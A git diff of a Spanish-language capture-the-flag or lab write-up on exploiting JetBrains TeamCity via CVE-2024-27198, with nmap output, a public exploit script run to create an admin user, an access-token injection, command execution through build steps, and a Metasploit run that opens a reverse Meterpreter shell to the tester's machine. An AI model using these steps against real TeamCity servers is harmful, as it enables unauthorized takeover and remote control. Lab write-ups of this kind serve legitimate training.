@@ -1,3 +1,7 @@
+# 1. ANÁLISIS INICIAL DE PUERTOS Y SERVICIOS
+
+## 1.1. Escaneo Nmap y servicios detectados
+
 ```bash
 Host is up (0.045s latency).
 Not shown: 65531 closed tcp ports (reset)
@@ -34,12 +38,21 @@ OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=1
 OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 ```
 
-
 Una vez hecho el escaneo, encontramos el puerto 50000, en donde se aloja una versión vulnerable de JetBrains TeamCity (Version 2023.11.3 (build 147512)).
+
+## 1.2. Identificación de la versión vulnerable de TeamCity
 
 ![](Evidencias_Visuales/vulnerableversion)
 
+---
+
+# 2. EXPLOTACIÓN DE LA VULNERABILIDAD CVE-2024-27198
+
+## 2.1 Investigación OSINT de la vulnerabilidad crítica
+
 Mediante investigación OSINT encontramos una vulnerabilidad crítica (CVE-2024-27198) que podemos entender a detalle en el siguiente enlace hxxps[://]rapid7[.]com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/?ref=blog.gitguardian.com (todos los links se encuentran desactivados, si se desea ingresar a las páginas se deben quitar los corchetes y cambiar el formato de hxxps[://] a  https://)
+
+## 2.2 Creación de usuario administrador mediante exploit
 
 Esta vulnerabilidad crítica con un base score de 9.8, permite ejecutar código malicioso con el cual podemos crear un nuevo usaurio y contraseña, los cuales serán almacenados y nos permitira acceso completo a la página web, el código lo podemos encontrar en la siguiente dirección: hxxps[://]github[.]com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py
 
@@ -54,6 +67,8 @@ Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:5
 ![](Evidencias_Visuales/newcredentials)
 
 ![](Evidencias_Visuales/newlogin)
+
+## 2.3 Inyección alternativa de token de acceso
 
 Otra forma de lograr acceso es mediante la inyección de un token de acceso al usuario admin mediante el comando: 
 
@@ -72,9 +87,17 @@ Date: Mon, 22 Jun 2026 11:11:28 GMT
 ```
 ![](Evidencias_Visuales/accesstoken)
 
+---
+
+# 3. ACCESO Y CONFIGURACIÓN DEL SISTEMA
+
+## 3.1 Acceso a la interfaz web de TeamCity
+
 Una vez dentro del sistema, y con un usuario con permisos de adminsitrador, podemos, dentro de TeamCity, crear un nuevo proyecto con el cual podremos ejecutar líneas de comandos.
 
 ![](Evidencias_Visuales/buildsteps)
+
+## 3.2 Configuración del agente de compilación
 
 Pero antes de ejecutar el proyecto, debemos asegurarnos de tener un agente activado ya que en TeamCity, un agente de compilación (build agent) es un programa de software independiente que escucha las órdenes del servidor central de TeamCity y ejecuta las tareas reales de compilación, pruebas y despliegue (CI/CD)
 
@@ -84,10 +107,16 @@ Para ello debemos instalar el agente en nuestro equipo para que reciba los coman
 
 ![](Evidencias_Visuales/agent)
 
+## 3.3 Creación y ejecución de comandos en el proyecto
+
 Una vez instalado el agente, podemos ejecutar la línea de comandos mediante el comando Run
 ![](Evidencias_Visuales/runbassic)
 
-#Opción 2: Metasploit 
+---
+
+# 4. MÉTODO ALTERNATIVO: EXPLOTACIÓN CON METASPLOIT 
+
+## 4.1 Configuración del módulo de explotación
 
 ```bash
 search cve:2024-27198
@@ -129,7 +158,11 @@ Exploit target:
    Id  Name
    --  ----
    0   Java
+```
 
+## 4.2 Obtención de shell inversa con Meterpreter
+
+```bash
 msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit
 [*] Started reverse TCP handler on 192.168.128.160:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -148,6 +181,8 @@ meterpreter > shell
 Process 1 created.
 Channel 1 created.
 ```
+
+## 4.3 Acceso al sistema y recuperación de la flag
 
 ```bash
 cd /home/ubuntu
